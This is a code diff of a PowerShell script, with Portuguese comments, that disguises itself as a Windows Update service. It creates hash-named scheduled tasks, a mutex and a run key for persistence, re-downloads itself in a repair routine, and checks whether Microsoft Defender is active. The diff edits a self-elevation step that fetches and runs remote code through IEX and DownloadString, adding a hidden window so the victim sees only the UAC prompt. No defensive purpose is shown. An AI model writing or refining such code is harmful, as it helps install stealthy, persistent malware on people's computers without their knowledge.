@@ -6,7 +6,7 @@ $serverPort = 4000
 
 $h = [System.BitConverter]::ToString(
     [System.Security.Cryptography.MD5]::Create().ComputeHash(
-        [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
+    [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
 $installName = "WinUpdateSvc_$h"
 $taskName    = "MicrosoftWindowsUpdateService_$h"
 $mutexName   = "Global\WinUpdateSvcMutex_$h"
@@ -93,7 +93,6 @@ function Repair-Installation {
         $taskB  = "MicrosoftWindowsUpdateBoot_$leaf"
         $runKey = "WinUpdateSvc_$leaf"
 
-        # Correção de download blindada
         $needDownload = $false
         if (-not (Test-Path $script)) {
             $needDownload = $true
@@ -147,7 +146,9 @@ if ($args -contains '-repair') { Repair-Installation -Trigger:($args -contains '
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    try { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
+    # AQUI: Removido o -NoExit e adicionado -WindowStyle Hidden. 
+    # A janela do UAC vai aparecer (obrigatório do Windows), mas a tela preta não abrirá.
+    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
 
@@ -159,7 +160,7 @@ if ($args -notcontains "-silent") {
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
         if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
-    } catch { $defenderOff = $true } # Se o cmdlet falhar, assume desativado
+    } catch { $defenderOff = $true } 
 
     if (-not $defenderOff) {
         $sd = "$env:TEMP\sd_$h"
